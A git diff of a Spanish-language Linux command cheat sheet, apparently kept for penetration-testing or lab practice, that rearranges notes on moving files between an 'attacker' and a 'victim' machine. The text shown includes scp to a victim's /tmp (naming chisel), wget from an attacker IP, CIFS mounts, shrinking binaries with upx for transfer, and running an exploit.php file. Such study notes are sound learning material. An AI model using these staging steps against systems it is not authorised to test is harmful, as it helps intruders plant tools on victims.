@@ -183,7 +183,6 @@ Tags: #Linux #Comandos #Netcat #Montura #Hash
 	# p = File to attack 'File.zip'
 ```
 
-Modos de transferir archivos desde la maquina de atacante 
 ```bash
 ❯ scp <file> root@<IP>:/tmp/chisel          # Podemos tranferir un archivo y lo depositamos en la ruta que hayamos colocado
 	# root = Usuario de la maquina victima 
@@ -195,7 +194,6 @@ Modos de transferir archivos desde la maquina de atacante
 ❯ md5sum file                              # Obtener el hash del archivo 
 ```
 
-Manera de descargar archivos en la maquina victima 
 ```bash
 ❯ wget http://❮IP❯/❮File❯                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
 ```
@@ -252,8 +250,9 @@ Manera de descargar archivos en la maquina victima
 ❯ unzip <file.zip>                             # Descomprimir un archivo zip   
 ```
 
-Para las monturas en Docker serian los siguientes comandos
 ```bash
+# Para las monturas en Docker serian los siguientes comandos
+
 ❯ mount -t cifs //127.0.0.1/myshare /mnt/mounted -o username=null,password=null,domain=,rw # Para crear una montura en un dir especifico de nuestra maquina **'/mnt/mounted'**, lo que modifiques en la montura se hara en la maquina real
 
 	# t = Tipo de montura 'cifs'
@@ -294,4 +293,8 @@ Para las monturas en Docker serian los siguientes comandos
 
 ❯ go build -ldflags "-s -w"               # Bajar el peso mientras se compila un archivo con 'go'
 ❯ upx <File>                              # Bajar el peso al archivo para transferirlo a la maquina victima mas rapido
+```
+
+```bash 
+❯ php -f exploit.php                      # Ejecutar un archivo con extension PHP
 ```
